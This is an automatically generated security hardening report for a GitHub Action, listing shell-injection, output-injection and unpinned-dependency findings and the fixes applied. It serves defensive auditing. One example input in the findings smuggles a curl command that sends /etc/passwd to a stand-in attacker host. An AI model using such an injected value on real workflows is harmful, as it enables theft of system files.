<!-- markdownlint-disable -->

# Hardening Report: LizardByte--jellyfin-plugin-repo/v2024.919.151635

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **LizardByte--jellyfin-plugin-repo/v2024.919.151635** was hardened automatically. 13 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Multiple ${{ ... }} expressions from attacker-controllable contexts are interpolated directly inside run: shell command strings, violating sub-rule (a). In the 'Setup inputs' step, inputs such as inputs.action, inputs.branch, inputs.gh_pages_url, inputs.repository, inputs.release_tag, inputs.zipfile, inputs.plugin_url, and github context values (github.event.repository.name, github.event.repository, github.workspace, github.event.repository.html_url) are all expanded directly into shell code before the shell parses them. A malicious caller can inject arbitrary shell commands (e.g., inputs.action set to 'add; curl -d @/etc/passwd attacker.com'). The 'Install dependencies' step also interpolates ${{ steps.setup-python.outputs.python-path }} directly in run:, and the 'JPRM repo' step does the same with multiple ${{ steps.inputs.outputs.* }} values.

Locations:

- `action.yml:53`
- `action.yml:54`
- `action.yml:55`
- `action.yml:56`
- `action.yml:57`
- `action.yml:70`
- `action.yml:72`
- `action.yml:80`
- `action.yml:83`
- `action.yml:85`
- `action.yml:86`
- `action.yml:89`
- `action.yml:90`
- `action.yml:92`
- `action.yml:114`
- `action.yml:128`

### github-env-injection (severity: high)

The 'Setup inputs' step writes values derived from untrusted inputs (inputs.action, inputs.branch, inputs.gh_pages_url, inputs.repository, inputs.release_tag) and github context values (github.event.repository.name, github.event.repository.html_url) to $GITHUB_OUTPUT via shell variables ($action, $branch, $gh_pages_url, $repository, $release_tag, $release_version, $source_repository, $plugin_url, $zipfile_name, $zipfile_path) without the required sanitization step (printf '%s' "$VAR" | tr -d '\n\r'). An attacker can inject newlines into these values to poison subsequent steps' environment or outputs. For example: `echo "action=${action}" >> $GITHUB_OUTPUT` where $action came from ${{ inputs.action }} with no sanitization.

Locations:

- `action.yml:95`
- `action.yml:96`
- `action.yml:97`
- `action.yml:98`
- `action.yml:99`
- `action.yml:100`
- `action.yml:102`
- `action.yml:104`
- `action.yml:105`
- `action.yml:106`

### unpinned-uses (severity: high)

Three uses: references in action.yml are pinned to mutable version tags rather than immutable 40-character SHA digests, making the action vulnerable to supply-chain attacks if any of these upstream actions are compromised or their tags are moved: (1) actions/setup-python@v5, (2) actions/checkout@v4, (3) actions-js/push@v1.5. Each should be replaced with the corresponding full commit SHA.

Locations:

- `action.yml:107`
- `action.yml:118`
- `action.yml:155`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.action }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:51`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.branch }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:52`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.gh_pages_url }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:53`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.repository }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:54`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.release_tag }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:55`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.zipfile }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:83`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.zipfile }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:89`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.zipfile }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:90`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.plugin-url }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:93`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.plugin_url }}" appears directly in run: block of step "Setup inputs"; move to env: map

Locations:

- `action.yml:96`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, github-env-injection, unpinned-uses

**Notes:**

Rewrote action.yml to fix all findings. (1) script-injection and static-inline-injection: Moved all ${{ inputs.* }}, ${{ github.* }}, and ${{ steps.*.outputs.* }} expressions from run: blocks into env: blocks; shell scripts now reference plain environment variables. (2) github-env-injection: All values written to $GITHUB_OUTPUT are now sanitized with printf and tr -d newlines before being echoed to prevent newline injection. (3) unpinned-uses: Pinned all three actions to full commit SHAs: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 (v5), actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 (v4), actions-js/push@5a7cbd780d82c0c937b5977586e641b2fd94acc5 (v1.5). Also fixed a bug where github.event.repository (object) was used in a regex match, replaced with github.event.repository.full_name (string).

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed unquoted shell variable expansion in the 'Setup inputs' run block of action.yml. Changed `case $action in` to `case "$action" in` on line 70 to prevent shell metacharacter injection from the caller-controlled `inputs.action` value.

